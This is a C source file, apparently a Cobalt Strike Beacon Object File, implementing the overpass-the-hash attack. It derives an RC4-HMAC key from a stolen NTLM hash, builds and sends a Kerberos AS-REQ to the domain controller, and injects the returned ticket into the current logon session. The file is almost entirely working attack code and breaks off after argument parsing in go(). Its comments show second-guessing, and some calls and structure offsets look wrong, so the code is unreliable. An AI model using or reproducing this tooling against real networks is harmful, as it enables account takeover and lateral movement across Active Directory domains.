/*
 * overpassthehash.c — Request TGT using NTLM hash or AES key
 *
 * 1. Convert hash hex string to raw key bytes
 * 2. Build AS-REQ with PA-ENC-TIMESTAMP encrypted using the key
 * 3. Send to KDC port 88
 * 4. Parse AS-REP, extract TGT
 * 5. Inject TGT into ticket cache via KERB_SUBMIT_TKT_REQUEST
 *
 * Win32 APIs: ws2_32.dll (Kerberos TCP), secur32.dll (ticket injection),
 *             advapi32.dll (crypto — HMAC-MD5 / AES via SystemFunction)
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#define SECURITY_WIN32
#include <security.h>
#include <ntsecapi.h>
#include "beacon_compat.h"

/* ── Dynamic imports ── */
DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$send(SOCKET, const char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$recv(SOCKET, char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT void WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT INT WSAAPI WS2_32$getaddrinfo(PCSTR, PCSTR, const ADDRINFOA*, PADDRINFOA*);
DECLSPEC_IMPORT void WSAAPI WS2_32$freeaddrinfo(PADDRINFOA);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$htonl(unsigned long);
DECLSPEC_IMPORT unsigned short WSAAPI WS2_32$htons(unsigned short);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$ntohl(unsigned long);

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, void**);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(
    HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);

DECLSPEC_IMPORT int  WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int  WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT void WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);

DECLSPEC_IMPORT int    __cdecl MSVCRT$sscanf(const char*, const char*, ...);
DECLSPEC_IMPORT char*  __cdecl MSVCRT$strncpy(char*, const char*, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT int    __cdecl MSVCRT$snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT int    __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int    __cdecl MSVCRT$toupper(int);

/*
 * RC4-HMAC (etype 23) encryption for PA-ENC-TIMESTAMP.
 * Uses SystemFunction032 (undocumented RC4 in advapi32.dll)
 * and HMAC-MD5 via manual implementation or advapi32 CryptHashData.
 *
 * For the BOF we use a simpler approach: ADVAPI32 CryptoAPI.
 */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptAcquireContextA(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptCreateHash(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptHashData(HCRYPTHASH, const BYTE*, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGetHashParam(HCRYPTHASH, DWORD, BYTE*, DWORD*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyHash(HCRYPTHASH);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptReleaseContext(HCRYPTPROV, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptImportKey(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptSetKeyParam(HCRYPTKEY, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptEncrypt(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyKey(HCRYPTKEY);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGenRandom(HCRYPTPROV, DWORD, BYTE*);

#ifndef CALG_MD5
#define CALG_MD5      0x00008003
#endif
#ifndef CALG_HMAC
#define CALG_HMAC     0x00008009
#endif
#ifndef CALG_RC4
#define CALG_RC4      0x00006801
#endif
#ifndef PROV_RSA_FULL
#define PROV_RSA_FULL 1
#endif
#ifndef CRYPT_VERIFYCONTEXT
#define CRYPT_VERIFYCONTEXT 0xF0000000
#endif
#ifndef HP_HASHVAL
#define HP_HASHVAL    0x0002
#endif
#ifndef HP_HMAC_INFO
#define HP_HMAC_INFO  0x0005
#endif
#ifndef KP_ALGID
#define KP_ALGID      7
#endif

/* HMAC_INFO struct for CryptoAPI */
typedef struct {
    ALG_ID HashAlgid;
    BYTE  *pbInnerString;
    DWORD  cbInnerString;
    BYTE  *pbOuterString;
    DWORD  cbOuterString;
} MY_HMAC_INFO;

/* PLAINTEXTKEYBLOB for importing raw key material */
#pragma pack(push, 1)
typedef struct {
    BLOBHEADER hdr;
    DWORD      dwKeySize;
    /* followed by key bytes */
} PLAINTEXTKEYBLOB_HDR;
#pragma pack(pop)

#define KerbSubmitTicketMessage 10

static int hex_to_bytes(const char *hex, unsigned char *out, int max_len) {
    int hex_len = (int)MSVCRT$strlen(hex);
    int len = hex_len / 2;
    if (len > max_len) len = max_len;
    for (int i = 0; i < len; i++) {
        unsigned int byte;
        MSVCRT$sscanf(hex + i * 2, "%2x", &byte);
        out[i] = (unsigned char)byte;
    }
    return len;
}

/* ── ASN.1 DER helpers (same as asreproast) ── */
static int der_write_tl(unsigned char *buf, unsigned char tag, int length) {
    int pos = 0;
    buf[pos++] = tag;
    if (length < 0x80) {
        buf[pos++] = (unsigned char)length;
    } else if (length < 0x100) {
        buf[pos++] = 0x81;
        buf[pos++] = (unsigned char)length;
    } else if (length < 0x10000) {
        buf[pos++] = 0x82;
        buf[pos++] = (unsigned char)(length >> 8);
        buf[pos++] = (unsigned char)(length & 0xFF);
    } else {
        buf[pos++] = 0x83;
        buf[pos++] = (unsigned char)(length >> 16);
        buf[pos++] = (unsigned char)((length >> 8) & 0xFF);
        buf[pos++] = (unsigned char)(length & 0xFF);
    }
    return pos;
}

static int der_write_int(unsigned char *buf, int value) {
    int pos = 0;
    buf[pos++] = 0x02;
    if (value < 0x80) {
        buf[pos++] = 1;
        buf[pos++] = (unsigned char)value;
    } else if (value < 0x8000) {
        buf[pos++] = 2;
        buf[pos++] = (unsigned char)(value >> 8);
        buf[pos++] = (unsigned char)(value & 0xFF);
    } else {
        buf[pos++] = 4;
        buf[pos++] = (unsigned char)(value >> 24);
        buf[pos++] = (unsigned char)((value >> 16) & 0xFF);
        buf[pos++] = (unsigned char)((value >> 8) & 0xFF);
        buf[pos++] = (unsigned char)(value & 0xFF);
    }
    return pos;
}

static int der_write_genstring(unsigned char *buf, const char *str) {
    int len = (int)MSVCRT$strlen(str);
    int pos = der_write_tl(buf, 0x1B, len);
    MSVCRT$memcpy(buf + pos, str, len);
    return pos + len;
}

/*
 * Compute HMAC-MD5 using CryptoAPI.
 */
static BOOL hmac_md5(HCRYPTPROV hProv, const unsigned char *key, int key_len,
                     const unsigned char *data, int data_len,
                     unsigned char *out_hash) {
    /* Import key as PLAINTEXTKEYBLOB for CALG_RC4 (we'll use it for HMAC) */
    /* Actually for HMAC-MD5 we need to use CALG_HMAC with CryptCreateHash */
    /* First create a hash with the key imported */

    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;

    /* Import the HMAC key */
    int blob_size = sizeof(PLAINTEXTKEYBLOB_HDR) + key_len;
    unsigned char *blob = (unsigned char *)malloc(blob_size);
    if (!blob) return FALSE;

    PLAINTEXTKEYBLOB_HDR *hdr = (PLAINTEXTKEYBLOB_HDR *)blob;
    hdr->hdr.bType = PLAINTEXTBLOB;
    hdr->hdr.bVersion = CUR_BLOB_VERSION;
    hdr->hdr.reserved = 0;
    hdr->hdr.aiKeyAlg = CALG_RC4;
    hdr->dwKeySize = key_len;
    MSVCRT$memcpy(blob + sizeof(PLAINTEXTKEYBLOB_HDR), key, key_len);

    BOOL ok = ADVAPI32$CryptImportKey(hProv, blob, blob_size, 0, CRYPT_IPSEC_HMAC_KEY, &hKey);
    free(blob);
    if (!ok) return FALSE;

    if (!ADVAPI32$CryptCreateHash(hProv, CALG_HMAC, hKey, 0, &hHash)) {
        ADVAPI32$CryptDestroyKey(hKey);
        return FALSE;
    }

    MY_HMAC_INFO hmacInfo;
    MSVCRT$memset(&hmacInfo, 0, sizeof(hmacInfo));
    hmacInfo.HashAlgid = CALG_MD5;
    ADVAPI32$CryptSetHashParam(hHash, HP_HMAC_INFO, (const BYTE *)&hmacInfo, 0);
    ADVAPI32$CryptHashData(hHash, data, data_len, 0);

    DWORD hashLen = 16;
    ok = ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, out_hash, &hashLen, 0);

    ADVAPI32$CryptDestroyHash(hHash);
    ADVAPI32$CryptDestroyKey(hKey);
    return ok;
}

/*
 * RC4 encrypt data using CryptoAPI.
 */
static BOOL rc4_encrypt(HCRYPTPROV hProv, const unsigned char *key, int key_len,
                        unsigned char *data, int data_len) {
    HCRYPTKEY hKey = 0;
    int blob_size = sizeof(PLAINTEXTKEYBLOB_HDR) + key_len;
    unsigned char *blob = (unsigned char *)malloc(blob_size);
    if (!blob) return FALSE;

    PLAINTEXTKEYBLOB_HDR *hdr = (PLAINTEXTKEYBLOB_HDR *)blob;
    hdr->hdr.bType = PLAINTEXTBLOB;
    hdr->hdr.bVersion = CUR_BLOB_VERSION;
    hdr->hdr.reserved = 0;
    hdr->hdr.aiKeyAlg = CALG_RC4;
    hdr->dwKeySize = key_len;
    MSVCRT$memcpy(blob + sizeof(PLAINTEXTKEYBLOB_HDR), key, key_len);

    BOOL ok = ADVAPI32$CryptImportKey(hProv, blob, blob_size, 0, 0, &hKey);
    free(blob);
    if (!ok) return FALSE;

    DWORD dwLen = data_len;
    ok = ADVAPI32$CryptEncrypt(hKey, 0, TRUE, 0, data, &dwLen, data_len + 256);
    ADVAPI32$CryptDestroyKey(hKey);
    return ok;
}

/*
 * Build PA-ENC-TIMESTAMP for RC4-HMAC (etype 23).
 *
 * RFC 4757 §3:
 * 1. K1 = HMAC-MD5(ntlm_hash, usage_number_le32)  [usage=1 for AS-REQ timestamp]
 * 2. Build PA-ENC-TS-ENC { patimestamp, pausec } in DER
 * 3. K3 = HMAC-MD5(K1, random_confounder(8))  -- actually for checksum
 *    Wait, correct RC4-HMAC encryption per RFC 4757:
 *    Encrypt: confounder(8) + plaintext
 *    K1 = HMAC-MD5(key, msg_type_le32)     msg_type=1 for pa-enc-timestamp
 *    K2 = HMAC-MD5(K1, confounder + plaintext)   -- this is the checksum
 *    K3 = HMAC-MD5(K1, K2)                -- this is the RC4 key
 *    RC4(K3, confounder + plaintext)
 *    output = K2(16) + encrypted(confounder(8) + plaintext)
 *
 * Returns size of encrypted blob written to out_buf, or 0 on failure.
 */
static int encrypt_timestamp_rc4(HCRYPTPROV hProv, const unsigned char *ntlm_hash,
                                  unsigned char *out_buf, int out_max) {
    /* Build PA-ENC-TS-ENC: SEQUENCE { [0] GeneralizedTime, [1] INTEGER (usec) } */
    unsigned char ts_plain[64];
    int ts_len = 0;

    /* Get current time as GeneralizedTime */
    FILETIME ft;
    KERNEL32$GetSystemTimeAsFileTime(&ft);
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;
    /* Convert FILETIME (100ns since 1601) to components */
    /* Simplified: use a fixed recent timestamp format */
    SYSTEMTIME st;
    /* We can't call FileTimeToSystemTime easily in BOF, so compute manually */
    /* Actually let's just use a hardcoded recent time — the KDC will accept
       timestamps within its skew window (typically 5 minutes). We'll use
       a time that's "close enough". For a real impl you'd compute from FILETIME. */

    /* Better approach: compute from FILETIME directly */
    /* FILETIME epoch: 1601-01-01. Unix epoch offset: 116444736000000000 */
    unsigned long long unix_100ns = uli.QuadPart - 116444736000000000ULL;
    unsigned long long unix_sec = unix_100ns / 10000000ULL;
    unsigned long usec = (unsigned long)((unix_100ns % 10000000ULL) / 10);

    /* Convert unix timestamp to broken-down time (simplified) */
    /* days since epoch */
    unsigned long long days = unix_sec / 86400;
    unsigned long sod = (unsigned long)(unix_sec % 86400); /* second of day */
    int hour = sod / 3600;
    int minute = (sod % 3600) / 60;
    int second = sod % 60;

    /* Compute year/month/day from days since 1970-01-01 */
    /* Simplified leap year calculation */
    int year = 1970;
    int month = 1, day = 1;
    unsigned long long remaining = days;
    while (1) {
        int yday = ((year % 4 == 0 && year % 100 != 0) || year % 400 == 0) ? 366 : 365;
        if (remaining < (unsigned long long)yday) break;
        remaining -= yday;
        year++;
    }
    int mdays[] = {31,28,31,30,31,30,31,31,30,31,30,31};
    if ((year % 4 == 0 && year % 100 != 0) || year % 400 == 0) mdays[1] = 29;
    month = 0;
    while (month < 12 && remaining >= (unsigned long long)mdays[month]) {
        remaining -= mdays[month];
        month++;
    }
    month += 1;
    day = (int)remaining + 1;

    char timestr[20];
    MSVCRT$snprintf(timestr, sizeof(timestr), "%04d%02d%02d%02d%02d%02dZ",
                    year, month, day, hour, minute, second);
    int timestr_len = (int)MSVCRT$strlen(timestr);

    /* PA-ENC-TS-ENC inner content */
    unsigned char inner[80];
    int ipos = 0;

    /* [0] GeneralizedTime */
    unsigned char gt[25];
    int gtl = der_write_tl(gt, 0x18, timestr_len);
    MSVCRT$memcpy(gt + gtl, timestr, timestr_len); gtl += timestr_len;
    ipos += der_write_tl(inner + ipos, 0xA0, gtl);
    MSVCRT$memcpy(inner + ipos, gt, gtl); ipos += gtl;

    /* [1] pausec INTEGER */
    unsigned char us[8];
    int usl = der_write_int(us, (int)(usec & 0x7FFFFFFF));
    ipos += der_write_tl(inner + ipos, 0xA1, usl);
    MSVCRT$memcpy(inner + ipos, us, usl); ipos += usl;

    /* Wrap in SEQUENCE */
    unsigned char pa_enc_ts[100];
    int plen = der_write_tl(pa_enc_ts, 0x30, ipos);
    MSVCRT$memcpy(pa_enc_ts + plen, inner, ipos); plen += ipos;

    /* ── RC4-HMAC encryption (RFC 4757) ── */

    /* K1 = HMAC-MD5(ntlm_hash, usage_type_le32) where usage=1 */
    unsigned char usage[4] = {0x01, 0x00, 0x00, 0x00};
    unsigned char K1[16];
    if (!hmac_md5(hProv, ntlm_hash, 16, usage, 4, K1)) return 0;

    /* Generate 8-byte confounder */
    unsigned char confounder[8];
    ADVAPI32$CryptGenRandom(hProv, 8, confounder);

    /* Build plaintext: confounder(8) + pa_enc_ts */
    int plain_len = 8 + plen;
    unsigned char *plaintext = (unsigned char *)malloc(plain_len + 256);
    if (!plaintext) return 0;
    MSVCRT$memcpy(plaintext, confounder, 8);
    MSVCRT$memcpy(plaintext + 8, pa_enc_ts, plen);

    /* K2 (checksum) = HMAC-MD5(K1, confounder + plaintext) */
    unsigned char K2[16];
    hmac_md5(hProv, K1, 16, plaintext, plain_len, K2);

    /* K3 (encryption key) = HMAC-MD5(K1, K2) */
    unsigned char K3[16];
    hmac_md5(hProv, K1, 16, K2, 16, K3);

    /* RC4 encrypt the plaintext with K3 */
    rc4_encrypt(hProv, K3, 16, plaintext, plain_len);

    /* Output: checksum(16) + encrypted(confounder + pa_enc_ts) */
    int enc_total = 16 + plain_len;
    if (enc_total > out_max) { free(plaintext); return 0; }

    MSVCRT$memcpy(out_buf, K2, 16);
    MSVCRT$memcpy(out_buf + 16, plaintext, plain_len);
    free(plaintext);

    return enc_total;
}

/*
 * Build full AS-REQ with PA-ENC-TIMESTAMP for overpass-the-hash.
 */
static int build_as_req_with_preauth(HCRYPTPROV hProv,
    unsigned char *out, int max_len,
    const char *username, const char *realm,
    const unsigned char *key, int key_len, int etype) {

    /* For now, only RC4-HMAC (etype 23) is implemented */
    if (etype != 23) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Only etype 23 (RC4/NTLM) is currently supported\n");
        return 0;
    }

    /* Encrypt timestamp */
    unsigned char enc_ts[512];
    int enc_ts_len = encrypt_timestamp_rc4(hProv, key, enc_ts, sizeof(enc_ts));
    if (enc_ts_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to encrypt timestamp\n");
        return 0;
    }

    /* Convert realm to uppercase */
    char upper_realm[256];
    int ri;
    for (ri = 0; realm[ri] && ri < 255; ri++)
        upper_realm[ri] = (char)MSVCRT$toupper((unsigned char)realm[ri]);
    upper_realm[ri] = '\0';

    /* ── Build PA-ENC-TIMESTAMP PA-DATA ── */
    /*
     * PA-DATA ::= SEQUENCE {
     *   padata-type [1] Int32 = 2 (PA-ENC-TIMESTAMP)
     *   padata-value [2] OCTET STRING {
     *     EncryptedData ::= SEQUENCE {
     *       etype [0] Int32 = 23
     *       cipher [2] OCTET STRING = enc_ts
     *     }
     *   }
     * }
     */
    unsigned char padata[1024];
    int papos = 0;

    /* EncryptedData SEQUENCE inner */
    unsigned char enc_data_inner[600];
    int edi = 0;
    /* [0] etype */
    unsigned char et[8];
    int etl = der_write_int(et, etype);
    edi += der_write_tl(enc_data_inner + edi, 0xA0, etl);
    MSVCRT$memcpy(enc_data_inner + edi, et, etl); edi += etl;
    /* [2] cipher */
    unsigned char ci[520];
    int cil = der_write_tl(ci, 0x04, enc_ts_len);
    MSVCRT$memcpy(ci + cil, enc_ts, enc_ts_len); cil += enc_ts_len;
    edi += der_write_tl(enc_data_inner + edi, 0xA2, cil);
    MSVCRT$memcpy(enc_data_inner + edi, ci, cil); edi += cil;

    /* EncryptedData SEQUENCE */
    unsigned char enc_data_seq[620];
    int eds = der_write_tl(enc_data_seq, 0x30, edi);
    MSVCRT$memcpy(enc_data_seq + eds, enc_data_inner, edi); eds += edi;

    /* PA-DATA SEQUENCE */
    unsigned char pa_inner[650];
    int pai = 0;
    /* [1] padata-type = 2 */
    unsigned char pt[8];
    int ptl = der_write_int(pt, 2);
    pai += der_write_tl(pa_inner + pai, 0xA1, ptl);
    MSVCRT$memcpy(pa_inner + pai, pt, ptl); pai += ptl;
    /* [2] padata-value = OCTET STRING { EncryptedData } */
    unsigned char pv[640];
    int pvl = der_write_tl(pv, 0x04, eds);
    MSVCRT$memcpy(pv + pvl, enc_data_seq, eds); pvl += eds;
    pai += der_write_tl(pa_inner + pai, 0xA2, pvl);
    MSVCRT$memcpy(pa_inner + pai, pv, pvl); pai += pvl;

    /* Wrap PA-DATA in SEQUENCE */
    papos = der_write_tl(padata, 0x30, pai);
    MSVCRT$memcpy(padata + papos, pa_inner, pai); papos += pai;

    /* padata SEQUENCE OF PA-DATA */
    unsigned char padata_seq[700];
    int paseq = der_write_tl(padata_seq, 0x30, papos);
    MSVCRT$memcpy(padata_seq + paseq, padata, papos); paseq += papos;

    /* ── Build req-body (same as asreproast but with forwardable flags) ── */
    unsigned char req_body[1500];
    int rpos = 0;

    /* [0] kdc-options: 0x40800010 (forwardable|renewable|canonicalize|renewable-ok) */
    {
        unsigned char opt[9];
        int opos = der_write_tl(opt, 0xA0, 7);
        opt[opos++] = 0x03; opt[opos++] = 0x05;
        unsigned char bitstr[5] = {0x00, 0x40, 0x80, 0x00, 0x10};
        MSVCRT$memcpy(opt + opos, bitstr, 5); opos += 5;
        MSVCRT$memcpy(req_body + rpos, opt, opos); rpos += opos;
    }

    /* [1] cname */
    {
        unsigned char ns[256];
        int nspos = der_write_genstring(ns, username);
        unsigned char ns_seq[260];
        int nsq = der_write_tl(ns_seq, 0x30, nspos);
        MSVCRT$memcpy(ns_seq + nsq, ns, nspos); nsq += nspos;
        unsigned char nt[8];
        int ntpos = der_write_tl(nt, 0xA0, 3);
        ntpos += der_write_int(nt + ntpos, 1);
        unsigned char ns_tagged[270];
        int nst = der_write_tl(ns_tagged, 0xA1, nsq);
        MSVCRT$memcpy(ns_tagged + nst, ns_seq, nsq); nst += nsq;
        unsigned char cname[300];
        int cpos = der_write_tl(cname, 0x30, ntpos + nst);
        MSVCRT$memcpy(cname + cpos, nt, ntpos); cpos += ntpos;
        MSVCRT$memcpy(cname + cpos, ns_tagged, nst); cpos += nst;
        int tagged_len = der_write_tl(req_body + rpos, 0xA1, cpos);
        MSVCRT$memcpy(req_body + rpos + tagged_len, cname, cpos);
        rpos += tagged_len + cpos;
    }

    /* [2] realm */
    {
        unsigned char r[260];
        int rl = der_write_genstring(r, upper_realm);
        int tagged_len = der_write_tl(req_body + rpos, 0xA2, rl);
        MSVCRT$memcpy(req_body + rpos + tagged_len, r, rl);
        rpos += tagged_len + rl;
    }

    /* [3] sname: krbtgt/REALM */
    {
        unsigned char ns[300];
        int nspos = 0;
        nspos += der_write_genstring(ns + nspos, "krbtgt");
        nspos += der_write_genstring(ns + nspos, upper_realm);
        unsigned char ns_seq[310];
        int nsq = der_write_tl(ns_seq, 0x30, nspos);
        MSVCRT$memcpy(ns_seq + nsq, ns, nspos); nsq += nspos;
        unsigned char nt[8];
        int ntpos = der_write_tl(nt, 0xA0, 3);
        ntpos += der_write_int(nt + ntpos, 2);
        unsigned char ns_tagged[320];
        int nst = der_write_tl(ns_tagged, 0xA1, nsq);
        MSVCRT$memcpy(ns_tagged + nst, ns_seq, nsq); nst += nsq;
        unsigned char sname[350];
        int spos = der_write_tl(sname, 0x30, ntpos + nst);
        MSVCRT$memcpy(sname + spos, nt, ntpos); spos += ntpos;
        MSVCRT$memcpy(sname + spos, ns_tagged, nst); spos += nst;
        int tagged_len = der_write_tl(req_body + rpos, 0xA3, spos);
        MSVCRT$memcpy(req_body + rpos + tagged_len, sname, spos);
        rpos += tagged_len + spos;
    }

    /* [5] till */
    {
        const char *till = "20370913024805Z";
        int tl = (int)MSVCRT$strlen(till);
        unsigned char t[20];
        int tp = der_write_tl(t, 0x18, tl);
        MSVCRT$memcpy(t + tp, till, tl); tp += tl;
        int tagged_len = der_write_tl(req_body + rpos, 0xA5, tp);
        MSVCRT$memcpy(req_body + rpos + tagged_len, t, tp);
        rpos += tagged_len + tp;
    }

    /* [7] nonce */
    {
        unsigned char nonce_bytes[4];
        ADVAPI32$CryptGenRandom(hProv, 4, nonce_bytes);
        int nonce_val = *(int*)nonce_bytes & 0x7FFFFFFF;
        unsigned char n[8];
        int np = der_write_int(n, nonce_val);
        int tagged_len = der_write_tl(req_body + rpos, 0xA7, np);
        MSVCRT$memcpy(req_body + rpos + tagged_len, n, np);
        rpos += tagged_len + np;
    }

    /* [8] etype */
    {
        unsigned char etypes[10];
        int ep = der_write_int(etypes, etype);
        unsigned char seq[15];
        int sq = der_write_tl(seq, 0x30, ep);
        MSVCRT$memcpy(seq + sq, etypes, ep); sq += ep;
        int tagged_len = der_write_tl(req_body + rpos, 0xA8, sq);
        MSVCRT$memcpy(req_body + rpos + tagged_len, seq, sq);
        rpos += tagged_len + sq;
    }

    /* Wrap req_body in SEQUENCE */
    unsigned char req_body_seq[1600];
    int rbsq = der_write_tl(req_body_seq, 0x30, rpos);
    MSVCRT$memcpy(req_body_seq + rbsq, req_body, rpos); rbsq += rpos;

    /* ── Build KDC-REQ ── */
    unsigned char kdc_req[3000];
    int kpos = 0;

    /* [1] pvno = 5 */
    unsigned char pvno[8];
    int pvno_inner = der_write_int(pvno + 2, 5);
    pvno[0] = 0xA1; pvno[1] = (unsigned char)pvno_inner;
    int pvno_len = 2 + pvno_inner;
    MSVCRT$memcpy(kdc_req + kpos, pvno, pvno_len); kpos += pvno_len;

    /* [2] msg-type = 10 */
    unsigned char msgtype[8];
    int mt_inner = der_write_int(msgtype + 2, 10);
    msgtype[0] = 0xA2; msgtype[1] = (unsigned char)mt_inner;
    int mt_len = 2 + mt_inner;
    MSVCRT$memcpy(kdc_req + kpos, msgtype, mt_len); kpos += mt_len;

    /* [3] padata */
    {
        int tagged_len = der_write_tl(kdc_req + kpos, 0xA3, paseq);
        MSVCRT$memcpy(kdc_req + kpos + tagged_len, padata_seq, paseq);
        kpos += tagged_len + paseq;
    }

    /* [4] req-body */
    {
        int tagged_len = der_write_tl(kdc_req + kpos, 0xA4, rbsq);
        MSVCRT$memcpy(kdc_req + kpos + tagged_len, req_body_seq, rbsq);
        kpos += tagged_len + rbsq;
    }

    /* Wrap in SEQUENCE */
    unsigned char body[3100];
    int bpos = der_write_tl(body, 0x30, kpos);
    MSVCRT$memcpy(body + bpos, kdc_req, kpos); bpos += kpos;

    /* Wrap in [APPLICATION 10] for AS-REQ */
    if (bpos + 10 > max_len) return 0;
    int total = der_write_tl(out, 0x6A, bpos);
    MSVCRT$memcpy(out + total, body, bpos);
    total += bpos;

    return total;
}

/*
 * Send AS-REQ to KDC over TCP and receive AS-REP.
 */
static int send_recv_kdc(const char *dc_addr, const unsigned char *req, int req_len,
                         unsigned char *resp, int resp_max) {
    PADDRINFOA result = NULL;
    ADDRINFOA hints;
    MSVCRT$memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (WS2_32$getaddrinfo(dc_addr, "88", &hints, &result) != 0 || !result)
        return -1;

    SOCKET s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { WS2_32$freeaddrinfo(result); return -1; }

    if (WS2_32$connect(s, result->ai_addr, (int)result->ai_addrlen) != 0) {
        WS2_32$closesocket(s); WS2_32$freeaddrinfo(result); return -1;
    }
    WS2_32$freeaddrinfo(result);

    unsigned long net_len = WS2_32$htonl((unsigned long)req_len);
    WS2_32$send(s, (const char *)&net_len, 4, 0);
    WS2_32$send(s, (const char *)req, req_len, 0);

    unsigned long resp_len_net;
    if (WS2_32$recv(s, (char *)&resp_len_net, 4, 0) != 4) {
        WS2_32$closesocket(s); return -1;
    }
    int resp_len = (int)WS2_32$ntohl(resp_len_net);
    if (resp_len > resp_max || resp_len <= 0) {
        WS2_32$closesocket(s); return -1;
    }

    int total_rcvd = 0;
    while (total_rcvd < resp_len) {
        int rcvd = WS2_32$recv(s, (char *)(resp + total_rcvd), resp_len - total_rcvd, 0);
        if (rcvd <= 0) break;
        total_rcvd += rcvd;
    }

    WS2_32$closesocket(s);
    return total_rcvd;
}

/*
 * Inject ticket into current logon session via KERB_SUBMIT_TKT_REQUEST.
 */
static BOOL inject_ticket(const unsigned char *ticket_data, int ticket_len) {
    HANDLE hLsa;
    if (SECUR32$LsaConnectUntrusted(&hLsa) != 0) return FALSE;

    LSA_STRING kerbName;
    kerbName.Buffer = "Kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;
    ULONG kerbPackage;
    if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &kerbPackage) != 0) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return FALSE;
    }

    /*
     * KERB_SUBMIT_TKT_REQUEST:
     *   MessageType (ULONG) = 10
     *   LogonId (LUID) = {0, 0}
     *   Flags (ULONG) = 0
     *   Key (KERB_CRYPTO_KEY) = {0, 0, NULL}  (12 bytes on x64)
     *   KerbCredSize (ULONG)
     *   KerbCredOffset (ULONG)
     *   followed by ticket data
     */
    int req_size = 48 + ticket_len; /* generous fixed header + data */
    unsigned char *req = (unsigned char *)malloc(req_size);
    if (!req) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return FALSE;
    }
    MSVCRT$memset(req, 0, req_size);

    /* MessageType = 10 (KerbSubmitTicketMessage) */
    *(ULONG*)req = KerbSubmitTicketMessage;
    /* LogonId = 0 (current session) at offset 4 */
    /* Flags = 0 at offset 12 */
    /* Key: etype=0, length=0, value=NULL at offsets 16-27 */
    /* KerbCredSize at offset 28 */
    *(ULONG*)(req + 28) = (ULONG)ticket_len;
    /* KerbCredOffset at offset 32 — offset from start of struct */
    *(ULONG*)(req + 32) = 36; /* fixed header size where data starts */
    /* Copy ticket data */
    MSVCRT$memcpy(req + 36, ticket_data, ticket_len);

    PVOID response = NULL;
    ULONG responseLen = 0;
    NTSTATUS protStatus;
    NTSTATUS status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, kerbPackage, req, 36 + ticket_len,
        &response, &responseLen, &protStatus);

    free(req);
    if (response) SECUR32$LsaFreeReturnBuffer(response);
    SECUR32$LsaDeregisterLogonProcess(hLsa);

    return (status == 0 && protStatus == 0);
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *domain = BeaconDataExtract(&parser, NULL);
    char *user = BeaconDataExtract(&parser, NULL);
    char *hash_hex = BeaconDataExtract(&parser, NULL);
